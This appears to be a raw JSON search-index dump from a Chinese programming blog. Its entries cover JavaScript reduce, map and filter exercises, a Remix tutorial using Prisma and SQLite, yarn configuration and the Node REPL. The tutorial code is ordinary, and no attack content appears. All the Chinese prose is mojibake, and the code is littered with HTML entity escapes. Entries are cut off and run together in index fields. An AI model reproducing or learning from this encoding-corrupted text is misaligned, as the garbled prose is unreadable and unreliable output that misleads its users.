è¯·æ³¨æ„ï¼Œè¯„çº§åœ¨å¯¹è±¡ä¸­æ˜¯å­—ç¬¦ä¸²ï¼Œéœ€è¦å°†å…¶è½¬æ¢ä¸ºæ•°å­—å†ç”¨äºæ•°å­¦è¿ç®—ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  // å…¨å±€å˜é‡ const watchList = [ { \u0026#34;Title\u0026#34;: \u0026#34;Inception\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2010\u0026#34;, \u0026#34;Director\u0026#34;: \u0026#34;Christopher Nolan\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.8\u0026#34; }, { \u0026#34;Title\u0026#34;: \u0026#34;Interstellar\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2014\u0026#34;, \u0026#34;Director\u0026#34;: \u0026#34;Christopher Nolan\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;9.0\u0026#34; } ]; function getRating(watchList) { let averageRating = watchList // ä½¿ç”¨è¿‡æ»¤å™¨æŸ¥æ‰¾å…‹é‡Œæ–¯æ‰˜å¼—Â·è¯ºå…° (Christopher Nolan) å¯¼æ¼”çš„ç”µå½±  .filter(film =\u0026gt; film.Director === \u0026#34;Christopher Nolan\u0026#34;) // ä½¿ç”¨ map å°†ä»–ä»¬çš„è¯„åˆ†ä»å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—  .map(film =\u0026gt; Number(film.imdbRating)) // ä½¿ç”¨ reduce å°†ä»–ä»¬çš„è¯„åˆ†åŠ åœ¨ä¸€èµ·  .reduce((sumOfRatings, rating) =\u0026gt; sumOfRatings + rating) / // é™¤ä»¥è¯ºå…°ç‰‡æ•°å¾—åˆ°å¹³å‡è¯„åˆ†  watchList.filter(film =\u0026gt; film.Director === \u0026#34;Christopher Nolan\u0026#34;).length; return averageRating; } console.log(getRating(watchList)); // 8.9   \rä½¿ç”¨é«˜é˜¶å‡½æ•° mapã€filter æˆ–è€… reduce æ¥è§£å†³å¤æ‚é—®é¢˜ å·²ç»æ¥è§¦äº†é«˜é˜¶å‡½æ•°å¦‚ map()ã€ filter() å’Œ reduce()çš„ä½¿ç”¨ï¼Œæ˜¯æ—¶å€™ç”¨å®ƒä»¬æ¥å®Œæˆä¸€äº›å¤æ‚çš„æŒ‘æˆ˜äº†ã€‚\nä½¿ç”¨ map()ã€filter() å’Œ reduce() çš„ä»»ä½•ç»„åˆå®Œæˆ squareList å‡½æ•°çš„ä»£ç ã€‚\nä¼ é€’ä¸€ä¸ªåŒ…å«å®æ•°çš„æ•°ç»„ç»™å‡½æ•°æ—¶ï¼Œå‡½æ•°åº”è¿”å›ä¸€ä¸ªæ–°çš„æ•°ç»„ï¼ŒåªåŒ…å«æ­£æ•´æ•°ï¼ˆå°æ•°ä¸æ˜¯æ•´æ•°ï¼‰çš„å¹³æ–¹å€¼ï¼Œ ä¾‹å¦‚ [-3, 4.8, 5, 3, -3.2] è¿™æ ·ä¸€ä¸ªåŒ…å«å®æ•°çš„æ•°ç»„ã€‚\næ³¨æ„ï¼š å‡½æ•°ä¸åº”è¯¥åŒ…å«ä»»ä½•å½¢å¼çš„ for æˆ–è€… while å¾ªç¯æˆ–è€… forEach() å‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  const squareList = arr =\u0026gt; { // return arr  // .filter(num =\u0026gt; num \u0026gt; 0 \u0026amp;\u0026amp; num % parseInt(num) === 0)  // .map(num =\u0026gt; Math.pow(num, 2));  // æˆ–è€…  return arr.reduce((sqrIntegers, num) =\u0026gt; { return Number.isInteger(num) \u0026amp;\u0026amp; num \u0026gt; 0 ? sqrIntegers.concat(num * num) : sqrIntegers; }, []); }; const squaredIntegers = squareList([-3, 4.8, 5, 3, -3.2]); console.log(squaredIntegers); // [ 25, 9 ]   ","description":"reduce() æ–¹æ³•æŒ‰é¡ºåºåœ¨æ•°ç»„çš„æ¯ä¸ªå…ƒç´ ä¸Šæ‰§è¡Œç”¨æˆ·æä¾›çš„â€œreducerâ€å›è°ƒå‡½æ•°ï¼Œå¹¶ä¼ å…¥å¯¹å‰ä¸€ä¸ªå…ƒç´ è¿›è¡Œè®¡ç®—çš„è¿”å›å€¼ã€‚ åœ¨æ•°ç»„çš„æ‰€æœ‰å…ƒç´ ä¸Šè¿è¡Œ reducer çš„æœ€ç»ˆç»“æœæ˜¯å•ä¸ªå€¼ã€‚","id":94,"section":"javascript","tags":null,"title":"Array.prototype.reduce()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/reduce-programming/"},{"content":"ä¸€ã€åˆ›å»º Remix é¡¹ç›® npx create-remix@latest\ryarn\ryarn dev äºŒã€ç›®å½•ç»“æ„   app/ - æ‰€æœ‰Remixåº”ç”¨ç¨‹åºä»£ç çš„ä½ç½®\n  app/entry.client.tsx- JavaScript çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå®ƒå°†åœ¨åº”ç”¨ç¨‹åºåœ¨æµè§ˆå™¨ä¸­åŠ è½½æ—¶è¿è¡Œã€‚æˆ‘ä»¬ä½¿ç”¨æ­¤æ–‡ä»¶æ¥è¡¥å……æˆ‘ä»¬çš„ React ç»„ä»¶ã€‚\n  app/entry.server.tsx- JavaScript çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå½“è¯·æ±‚åˆ°è¾¾æ‚¨çš„æœåŠ¡å™¨æ—¶ï¼Œå®ƒå°†è¿è¡Œã€‚Remix å¤„ç†åŠ è½½æ‰€æœ‰å¿…è¦çš„æ•°æ®ï¼Œæ‚¨è´Ÿè´£å‘å›å“åº”ã€‚æˆ‘ä»¬å°†ä½¿ç”¨æ­¤æ–‡ä»¶å°† React åº”ç”¨å‘ˆç°ä¸ºå­—ç¬¦ä¸²/æµï¼Œå¹¶å°†å…¶ä½œä¸ºå“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚\n  app/root.tsx- åº”ç”¨ç¨‹åºæ”¾ç½®æ ¹ç»„ä»¶çš„ä½ç½®ã€‚åœ¨æ­¤å¤„å‘ˆç°å…ƒç´ ã€‚\n  app/routes/- æ‰€æœ‰\u0026quot;è·¯ç”±æ¨¡å—\u0026quot;çš„ä½ç½®ã€‚Remix ä½¿ç”¨æ­¤ç›®å½•ä¸­çš„æ–‡ä»¶æ ¹æ®æ–‡ä»¶çš„åç§°ä¸ºåº”ç”¨åˆ›å»º URL è·¯ç”±ã€‚\n  public/ - é™æ€èµ„äº§ï¼ˆå›¾åƒ/å­—ä½“/ç­‰ï¼‰çš„ä½ç½®\n  remix.config.js - Remixæœ‰ä¸€äº›é…ç½®é€‰é¡¹ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤æ–‡ä»¶ä¸­è®¾ç½®ã€‚\n  ä¸‰ã€è·¯ç”±ï¼ˆç¼–ç¨‹å¼/æ–‡ä»¶å¼ï¼‰ 1.è¿™é‡Œä½¿ç”¨æ–‡ä»¶å¼è·¯ç”±\n app/routes/index.tsx\n export default function IndexRoute() {\rreturn \u0026lt;div\u0026gt;Hello Index Route\u0026lt;/div\u0026gt;;\r} 2. å­è·¯ç”±ï¼ˆåµŒå¥—è·¯ç”±ï¼‰\n app/root.tsx\n import { LiveReload, Outlet } from \u0026#34;remix\u0026#34;;\rexport default function App() {\rreturn (\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charSet=\u0026#34;utf-8\u0026#34; /\u0026gt;\r\u0026lt;title\u0026gt;Remix: So great, it\u0026#39;s funny!\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Outlet /\u0026gt;\r{process.env.NODE_ENV === \u0026#34;development\u0026#34; ? (\r\u0026lt;LiveReload /\u0026gt;\r) : null}\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r);\r}  app/routes/jokes/index.tsx\n export default function JokesIndexRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s a random joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\rI was wondering why the frisbee was getting bigger,\rthen it hit me.\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}  app/routes/jokes/new.tsx\n export default function NewJokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent: \u0026lt;textarea name=\u0026#34;content\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34; className=\u0026#34;button\u0026#34;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 3.åŠ¨æ€è·¯ç”±ï¼ˆå‚æ•°åŒ–è·¯ç”±ï¼‰\n app/routes/jokes/$jokeId.tsx\n export default function JokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s your hilarious joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\rWhy don\u0026#39;t you find hippopotamuses hiding in trees?\rThey\u0026#39;re really good at it.\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} å››ã€æ ·å¼  å…¨å±€æ ·å¼   app/root.tsx\n import type { LinksFunction } from \u0026#34;remix\u0026#34;;\rimport { Links, LiveReload, Outlet } from \u0026#34;remix\u0026#34;;\rimport globalStylesUrl from \u0026#34;./styles/global.css\u0026#34;;\rimport globalMediumStylesUrl from \u0026#34;./styles/global-medium.css\u0026#34;;\rimport globalLargeStylesUrl from \u0026#34;./styles/global-large.css\u0026#34;;\rexport const links: LinksFunction = () =\u0026gt; {\rreturn [\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: globalStylesUrl\r},\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: globalMediumStylesUrl,\rmedia: \u0026#34;print, (min-width: 640px)\u0026#34;\r},\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: globalLargeStylesUrl,\rmedia: \u0026#34;screen and (min-width: 1024px)\u0026#34;\r}\r];\r};\rexport default function App() {\rreturn (\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charSet=\u0026#34;utf-8\u0026#34; /\u0026gt;\r\u0026lt;title\u0026gt;Remix: So great, it\u0026#39;s funny!\u0026lt;/title\u0026gt;\r\u0026lt;Links /\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Outlet /\u0026gt;\r{process.env.NODE_ENV === \u0026#34;development\u0026#34; ? (\r\u0026lt;LiveReload /\u0026gt;\r) : null}\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r);\r} ç»„ä»¶æ ·å¼ (éœ€è¦åœ¨root.tsxä¸­è°ƒç”¨ç»„ä»¶æ‰èƒ½æ¸²æŸ“)   app/routes/index.tsx\n import type { LinksFunction } from \u0026#34;remix\u0026#34;;\rimport { Link } from \u0026#34;remix\u0026#34;;\rimport stylesUrl from \u0026#34;../styles/index.css\u0026#34;;\rexport const links: LinksFunction = () =\u0026gt; {\rreturn [\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: stylesUrl\r}\r];\r};\rexport default function Index() {\rreturn (\r\u0026lt;div className=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;div className=\u0026#34;content\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;\rRemix \u0026lt;span\u0026gt;Jokes!\u0026lt;/span\u0026gt;\r\u0026lt;/h1\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li\u0026gt;\r\u0026lt;Link to=\u0026#34;jokes\u0026#34;\u0026gt;Read Jokes\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} äº”ã€æ•°æ®åº“ ï¼ˆè¿™é‡Œä½¿ç”¨Prisma ORM å’Œ SQLite æ•°æ®åº“ï¼‰ Step1. å®‰è£… Prisma\n ä¸º Prisma å®‰è£… VSCode æ’ä»¶\n yarn add --dev prisma //ç”¨äºåœ¨å¼€å‘è¿‡ç¨‹ä¸­ä¸æˆ‘ä»¬çš„æ•°æ®åº“å’Œschemaè¿›è¡Œäº¤äº’\ryarn add @prisma/client //ç”¨äºåœ¨è¿è¡Œæ—¶å¯¹æˆ‘ä»¬çš„æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ Step2. ç”¨ SQLite åˆå§‹åŒ– Prisma\nnpx prisma init --datasource-provider sqlite Step3. ä¸ºæ•°æ®å»ºæ¨¡\n prisma/schema.prisma\n generator client {\rprovider = \u0026#34;prisma-client-js\u0026#34;\r}\rdatasource db {\rprovider = \u0026#34;sqlite\u0026#34;\rurl = env(\u0026#34;DATABASE_URL\u0026#34;)\r}\rmodel Joke {\rid String @id @default(uuid())\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rname String\rcontent String\r} Step4. æ¨é€æ•°æ®æ¨¡å‹åˆ° SQLite\n å¦‚æœæ‚¨çš„æ•°æ®åº“æç ¸äº†ï¼Œæ‚¨å¯ä»¥éšæ—¶åˆ é™¤è¯¥prisma/dev.dbæ–‡ä»¶å¹¶npx prisma db pushå†æ¬¡è¿è¡Œã€‚\n npx prisma db push Step5. ç¦æ­¢ dev.db æäº¤åˆ° github\n .gitignore\n /prisma/dev.db\r.env Step6. æµ‹è¯•æ•°æ®å¡«å……æ•°æ®åº“\n prisma/seed.ts\n import { PrismaClient } from \u0026#34;@prisma/client\u0026#34;;\rconst db = new PrismaClient();\rasync function seed() {\rawait Promise.all(\rgetJokes().map(joke =\u0026gt; {\rreturn db.joke.create({ data: joke });\r})\r);\r}\rseed();\rfunction getJokes() {\r// shout-out to https://icanhazdadjoke.com/\rreturn [\r{\rname: \u0026#34;Road worker\u0026#34;,\rcontent: `I never wanted to believe that my Dad was stealing from his job as a road worker. But when I got home, all the signs were there.`\r},\r{\rname: \u0026#34;Frisbee\u0026#34;,\rcontent: `I was wondering why the frisbee was getting bigger, then it hit me.`\r},\r{\rname: \u0026#34;Trees\u0026#34;,\rcontent: `Why do trees seem suspicious on sunny days? Dunno, they\u0026#39;re just a bit shady.`\r},\r{\rname: \u0026#34;Skeletons\u0026#34;,\rcontent: `Why don\u0026#39;t skeletons ride roller coasters? They don\u0026#39;t have the stomach for it.`\r},\r{\rname: \u0026#34;Hippos\u0026#34;,\rcontent: `Why don\u0026#39;t you find hippopotamuses hiding in trees? They\u0026#39;re really good at it.`\r},\r{\rname: \u0026#34;Dinner\u0026#34;,\rcontent: `What did one plate say to the other plate? Dinner is on me!`\r},\r{\rname: \u0026#34;Elevator\u0026#34;,\rcontent: `My first time using an elevator was an uplifting experience. The second time let me down.`\r}\r];\r}  å®‰è£…esbuild-registerä¸ºå¼€å‘ä¾èµ–é¡¹ï¼š\n yarn add --dev esbuild-register  è¿è¡Œ seed.ts æ–‡ä»¶\n node --require esbuild-register prisma/seed.ts  å°†æ­¤æ·»åŠ åˆ°package.json,é¿å…æ¯æ¬¡é‡ç½®æ•°æ®éƒ½å¿…é¡»è®°ä½è¯¥è„šæœ¬\n // ...\r\u0026#34;prisma\u0026#34;: {\r\u0026#34;seed\u0026#34;: \u0026#34;node --require esbuild-register prisma/seed.ts\u0026#34;\r},\r\u0026#34;scripts\u0026#34;: {\r// ... Step7. è¿æ¥åˆ°æ•°æ®åº“\n prisma/seed.ts\n import { PrismaClient } from \u0026#34;@prisma/client\u0026#34;;\rconst db = new PrismaClient();  åˆ›å»º app/utils/db.server.ts\n import { PrismaClient } from \u0026#34;@prisma/client\u0026#34;;\rlet db: PrismaClient;\rdeclare global {\rvar __db: PrismaClient | undefined;\r}\r//è¿™æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºåœ¨å¼€å‘ä¸­æˆ‘ä»¬ä¸æƒ³åœ¨æ¯æ¬¡æ›´æ”¹æ—¶éƒ½é‡æ–°å¯åŠ¨æœåŠ¡å™¨ï¼Œ\r//ä½†æˆ‘ä»¬æƒ³ç¡®ä¿æˆ‘ä»¬ä¹Ÿä¸ä¼šåœ¨æ¯æ¬¡æ›´æ”¹æ—¶éƒ½åˆ›å»ºåˆ°æ•°æ®åº“çš„æ–°è¿æ¥ã€‚\rif (process.env.NODE_ENV === \u0026#34;production\u0026#34;) {\rdb = new PrismaClient();\rdb.$connect();\r} else {\rif (!global.__db) {\rglobal.__db = new PrismaClient();\rglobal.__db.$connect();\r}\rdb = global.__db;\r}\rexport { db }; Step8. é™åˆ¶æ•°æ®è·å–æ•°é‡\n app/routes/jokes\n type LoaderData = {\rjokeListItems: Array\u0026lt;{ id: string; name: string }\u0026gt;;\r};\rexport const loader: LoaderFunction = async () =\u0026gt; {\rconst data: LoaderData = {\rjokeListItems: await db.joke.findMany({\rtake: 5,\rselect: { id: true, name: true },\rorderBy: { createdAt: \u0026#34;desc\u0026#34; }\r})\r};\rreturn data;\r}; Step9. æ•°æ®åº“æŸ¥è¯¢\n app/routes/jokes/$jokeId.tsx\n import type { LoaderFunction } from \u0026#34;remix\u0026#34;;\rimport { Link, useLoaderData } from \u0026#34;remix\u0026#34;;\rimport type { Joke } from \u0026#34;@prisma/client\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rtype LoaderData = { joke: Joke };\rexport const loader: LoaderFunction = async ({\rparams\r}) =\u0026gt; {\rconst joke = await db.joke.findUnique({\rwhere: { id: params.jokeId }\r});\rif (!joke) throw new Error(\u0026#34;Joke not found\u0026#34;);\rconst data: LoaderData = { joke };\rreturn data;\r};\rexport default function JokeRoute() {\rconst data = useLoaderData\u0026lt;LoaderData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s your hilarious joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{data.joke.content}\u0026lt;/p\u0026gt;\r\u0026lt;Link to=\u0026#34;.\u0026#34;\u0026gt;{data.joke.name} Permalink\u0026lt;/Link\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}  éšæœºæŸ¥è¯¢ app/routes/jokes/index.tsx\n import type { LoaderFunction } from \u0026#34;remix\u0026#34;;\rimport { useLoaderData, Link } from \u0026#34;remix\u0026#34;;\rimport type { Joke } from \u0026#34;@prisma/client\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rtype LoaderData = { randomJoke: Joke };\rexport const loader: LoaderFunction = async () =\u0026gt; {\rconst count = await db.joke.count();\rconst randomRowNumber = Math.floor(Math.random() * count);\rconst [randomJoke] = await db.joke.findMany({\rtake: 1,\rskip: randomRowNumber\r});\rconst data: LoaderData = { randomJoke };\rreturn data;\r};\rexport default function JokesIndexRoute() {\rconst data = useLoaderData\u0026lt;LoaderData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s a random joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{data.randomJoke.content}\u0026lt;/p\u0026gt;\r\u0026lt;Link to={data.randomJoke.id}\u0026gt;\r\u0026#34;{data.randomJoke.name}\u0026#34; Permalink\r\u0026lt;/Link\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} Step10. çªå˜ ï¼ˆæ·»åŠ æ•°æ®ï¼‰\n app/routes/new.tsx\n import type { ActionFunction } from \u0026#34;remix\u0026#34;;\rimport { redirect } from \u0026#34;remix\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rconst form = await request.formData();\rconst name = form.get(\u0026#34;name\u0026#34;);\rconst content = form.get(\u0026#34;content\u0026#34;);\r// we do this type check to be extra sure and to make TypeScript happy\r// we\u0026#39;ll explore validation next!\rif (\rtypeof name !== \u0026#34;string\u0026#34; ||\rtypeof content !== \u0026#34;string\u0026#34;\r) {\rthrow new Error(`Form not submitted correctly.`);\r}\rconst fields = { name, content };\rconst joke = await db.joke.create({ data: fields });\rreturn redirect(`/jokes/${joke.id}`);\r};\rexport default function NewJokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent: \u0026lt;textarea name=\u0026#34;content\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34; className=\u0026#34;button\u0026#34;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} å…­ã€æ•°æ®éªŒè¯  app/routes/jokes/new.tsx\n import type { ActionFunction } from \u0026#34;remix\u0026#34;;\rimport { useActionData, redirect, json } from \u0026#34;remix\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rfunction validateJokeContent(content: string) {\rif (content.length \u0026lt; 10) {\rreturn `That joke is too short`;\r}\r}\rfunction validateJokeName(name: string) {\rif (name.length \u0026lt; 2) {\rreturn `That joke\u0026#39;s name is too short`;\r}\r}\rtype ActionData = {\rformError?: string;\rfieldErrors?: {\rname: string | undefined;\rcontent: string | undefined;\r};\rfields?: {\rname: string;\rcontent: string;\r};\r};\rconst badRequest = (data: ActionData) =\u0026gt;\rjson(data, { status: 400 });\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rconst form = await request.formData();\rconst name = form.get(\u0026#34;name\u0026#34;);\rconst content = form.get(\u0026#34;content\u0026#34;);\rif (\rtypeof name !== \u0026#34;string\u0026#34; ||\rtypeof content !== \u0026#34;string\u0026#34;\r) {\rreturn badRequest({\rformError: `Form not submitted correctly.`\r});\r}\rconst fieldErrors = {\rname: validateJokeName(name),\rcontent: validateJokeContent(content)\r};\rconst fields = { name, content };\rif (Object.values(fieldErrors).some(Boolean)) {\rreturn badRequest({ fieldErrors, fields });\r}\rconst joke = await db.joke.create({ data: fields });\rreturn redirect(`/jokes/${joke.id}`);\r};\rexport default function NewJokeRoute() {\rconst actionData = useActionData\u0026lt;ActionData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName:{\u0026#34; \u0026#34;}\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rdefaultValue={actionData?.fields?.name}\rname=\u0026#34;name\u0026#34;\raria-invalid={\rBoolean(actionData?.fieldErrors?.name) ||\rundefined\r}\raria-describedby={\ractionData?.fieldErrors?.name\r? \u0026#34;name-error\u0026#34;\r: undefined\r}\r/\u0026gt;\r\u0026lt;/label\u0026gt;\r{actionData?.fieldErrors?.name ? (\r\u0026lt;p\rclassName=\u0026#34;form-validation-error\u0026#34;\rrole=\u0026#34;alert\u0026#34;\rid=\u0026#34;name-error\u0026#34;\r\u0026gt;\r{actionData.fieldErrors.name}\r\u0026lt;/p\u0026gt;\r) : null}\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent:{\u0026#34; \u0026#34;}\r\u0026lt;textarea\rdefaultValue={actionData?.fields?.content}\rname=\u0026#34;content\u0026#34;\raria-invalid={\rBoolean(actionData?.fieldErrors?.content) ||\rundefined\r}\raria-describedby={\ractionData?.fieldErrors?.content\r? \u0026#34;content-error\u0026#34;\r: undefined\r}\r/\u0026gt;\r\u0026lt;/label\u0026gt;\r{actionData?.fieldErrors?.content ? (\r\u0026lt;p\rclassName=\u0026#34;form-validation-error\u0026#34;\rrole=\u0026#34;alert\u0026#34;\rid=\u0026#34;content-error\u0026#34;\r\u0026gt;\r{actionData.fieldErrors.content}\r\u0026lt;/p\u0026gt;\r) : null}\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34; className=\u0026#34;button\u0026#34;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} ä¸ƒã€èº«ä»½éªŒè¯ Step1. prisma/schema.prisma\n// This is your Prisma schema file,\r// learn more about it in the docs: https://pris.ly/d/prisma-schema\rgenerator client {\rprovider = \u0026#34;prisma-client-js\u0026#34;\r}\rdatasource db {\rprovider = \u0026#34;sqlite\u0026#34;\rurl = env(\u0026#34;DATABASE_URL\u0026#34;)\r}\rmodel User {\rid String @id @default(uuid())\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rusername String @unique\rpasswordHash String\rjokes Joke[]\r}\rmodel Joke {\rid String @id @default(uuid())\rjokesterId String\rjokester User @relation(fields: [jokesterId], references: [id], onDelete: Cascade)\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rname String\rcontent String\r} Step2. é‡ç½®æ•°æ®åº“\nnpx prisma db push ","description":"æˆ‘å¹¶ä¸çœ‹å¥½Remixè¿™ç§ç±»å‹çš„ä¸ä¼¦ä¸ç±»çš„æ¡†æ¶ï¼Œæ‰€ä»¥ä¸ä¼šå†æ›´æ–°","id":95,"section":"react","tags":null,"title":"Remix è¿›é˜¶","uri":"https://codthing.github.io/react/remix/remix-adv/"},{"content":"ä¸€ã€å…¨å±€é…ç½®yarn Step1. è·å–yarnçš„å®‰è£…ä½ç½®\nyarn global bin Step2. é…ç½®yarnå…¨å±€å˜é‡\n","description":"","id":96,"section":"others","tags":null,"title":"yarn æœ€ä½³å®è·µ","uri":"https://codthing.github.io/others/yarn/yarn-bp/"},{"content":"REPL è¡¨ç¤º Read Evaluate Print Loopï¼Œå®ƒæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ç¯å¢ƒï¼ˆåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªæ§åˆ¶å°çª—å£ï¼‰ï¼Œ\nå®ƒå°†å•ä¸ªè¡¨è¾¾å¼ä½œä¸ºç”¨æˆ·è¾“å…¥ï¼Œå¹¶åœ¨æ‰§è¡Œåå°†ç»“æœè¿”å›åˆ°æ§åˆ¶å°ã€‚\nREPL ä¼šè¯æä¾›äº†ä¸€ç§å¿«é€Ÿæµ‹è¯•ç®€å• JavaScript ä»£ç çš„ä¾¿æ·æ–¹å¼ã€‚\nä¸€ã€å¯åŠ¨æ–¹å¼ å¦‚æœæ²¡æœ‰ä»»ä½•è„šæœ¬æˆ–ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹è¿è¡Œ node å‘½ä»¤ï¼Œå°†å¯åŠ¨ä¸€ä¸ª REPL ä¼šè¯ï¼š\n1 2  node   \räºŒã€ç¼–å†™æµ‹è¯•ä»£ç  1 2 3 4 5  \u0026gt; console.log(\u0026#39;test\u0026#39;) test undefined \u0026gt;   ç¬¬ä¸€ä¸ªå€¼ test å‘Šè¯‰æ§åˆ¶å°æ‰“å°çš„è¾“å‡ºï¼Œç„¶åå¾—åˆ° undefinedï¼Œè¿™æ˜¯è¿è¡Œ console.log() çš„è¿”å›å€¼ã€‚ Node è¯»å–è¿™è¡Œä»£ç ï¼Œå¯¹å…¶è¿›è¡Œè¯„ä¼°ï¼Œæ‰“å°ç»“æœï¼Œç„¶åè¿”å›ç­‰å¾…æ›´å¤šè¡Œä»£ç ã€‚\nNode ä¼šåœ¨ REPL ä¸­æ‰§è¡Œçš„æ¯æ®µä»£ç å¾ªç¯è¿™ä¸‰ä¸ªæ­¥éª¤ï¼Œç›´åˆ°é€€å‡ºä¼šè¯ã€‚ è¿™å°±æ˜¯ REPL å¾—åçš„åœ°æ–¹ã€‚\nNode ä¼šè‡ªåŠ¨æ‰“å°ä»»ä½•ä¸€è¡Œ JavaScript ä»£ç çš„ç»“æœï¼Œè€Œæ— éœ€æŒ‡ç¤ºå®ƒå¦‚ä½•åšã€‚ ä¾‹å¦‚ï¼Œè¾“å…¥ä»¥ä¸‹è¡Œå¹¶æŒ‰å›è½¦é”®ï¼š\n1 2 3 4  \u0026gt; 5 === \u0026#39;5\u0026#39; false \u0026gt;   è¯·æ³¨æ„ä»¥ä¸Šä¸¤è¡Œè¾“å‡ºçš„å·®å¼‚ã€‚ Node REPL 